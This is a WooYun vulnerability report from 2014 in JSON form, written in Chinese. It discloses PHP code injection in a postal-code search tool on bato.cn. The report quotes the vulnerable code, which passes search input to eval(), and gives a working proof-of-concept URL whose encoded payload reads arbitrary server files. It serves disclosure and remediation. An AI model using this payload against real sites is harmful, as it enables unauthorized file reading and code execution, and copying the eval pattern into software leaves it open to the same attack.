{"id": 58942, "wybug_id": "wooyun-2014-049056", "wybug_title": "八通网便民百宝箱任意代码执行", "wybug_corp": "八通网", "wybug_author": "yibozheng", "wybug_date": "2014-01-16 14:32", "wybug_open_date": "2014-03-02 14:33", "wybug_type": "命令执行", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "未联系到厂商或者厂商积极忽略", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["任意文件上传", "文件上传漏洞", "任意"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2014-01-16：\t积极联系厂商并且等待厂商认领中，细节不对外公开\t\t\t\t\t\t\t\t\t2014-03-02：\t厂商已经主动忽略漏洞，细节向公众公开  简要描述：  详细说明：  \n\n\nswitch ($_GET['w']){                                        case \"sheng\":                                                @eval(\"\\$found = eregi(\\\"$keyword[$ai]\\\",\\\"$detail[0]\\\");\");                                                break;                                        case \"diqu\":                                                @eval(\"\\$found = eregi(\\\"$keyword[$ai]\\\",\\\"$detail[1]\\\");\");                                                break;                                        case \"shi\":                                                @eval(\"\\$found = eregi(\\\"$keyword[$ai]\\\",\\\"$detail[2]\\\");\");                                                break;                                        case \"cun\":                                                @eval(\"\\$found = eregi(\\\"$keyword[$ai]\\\",\\\"$detail[3]\\\");\");                                                break;                                        case \"youbian\":                                                @eval(\"\\$found = eregi(\\\"$keyword[$ai]\\\",\\\"$detail[4]\\\");\");                                                break;                                        case \"quhao\":                                                @eval(\"\\$found = eregi(\\\"$keyword[$ai]\\\",\\\"$detail[5]\\\");\");                                                break;                                        default:                                                @eval(\"\\$found = eregi(\\\"$keyword[$ai]\\\",\\\"$dreamdb[$i]\\\");\");                                                break;                                }\n   漏洞证明：  http://www.bato.cn/tool/youbian?q=%24%7B%40exit%28print_r%28file%28%24_GET%5Bd%5D%29%29%29%7D原来代码中，$keyword是输入的搜索内容，可以直接拼入php代码\nfor ($ai=0; $ai<$dreamcount; $ai++){                                switch ($_GET['w']){                                        case \"sheng\":                                                @eval(\"\\$found = eregi(\\\"$keyword[$ai]\\\",\\\"$detail[0]\\\");\");                                                break;                                        case \"diqu\":                                                @eval(\"\\$found = eregi(\\\"$keyword[$ai]\\\",\\\"$detail[1]\\\");\");                                                break;                                        case \"shi\":                                                @eval(\"\\$found = eregi(\\\"$keyword[$ai]\\\",\\\"$detail[2]\\\");\");                                                break;                                        case \"cun\":                                                @eval(\"\\$found = eregi(\\\"$keyword[$ai]\\\",\\\"$detail[3]\\\");\");                                                break;                                        case \"youbian\":                                                @eval(\"\\$found = eregi(\\\"$keyword[$ai]\\\",\\\"$detail[4]\\\");\");                                                break;                                        case \"quhao\":                                                @eval(\"\\$found = eregi(\\\"$keyword[$ai]\\\",\\\"$detail[5]\\\");\");                                                break;                                        default:                                                @eval(\"\\$found = eregi(\\\"$keyword[$ai]\\\",\\\"$dreamdb[$i]\\\");\");                                                break;                                }\n   修复方案：  禁止使用eval函数，去除敏感代码。   版权声明：转载请注明来源 yibozheng@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 未能联系到厂商或者厂商积极拒绝  ", "replys": "漏洞评价：\n评论\n  \n\n\n", "wybug_level_fromcorp": "无影响厂商忽略", "wybug_rank_fromcorp": 0, "Ranks": null}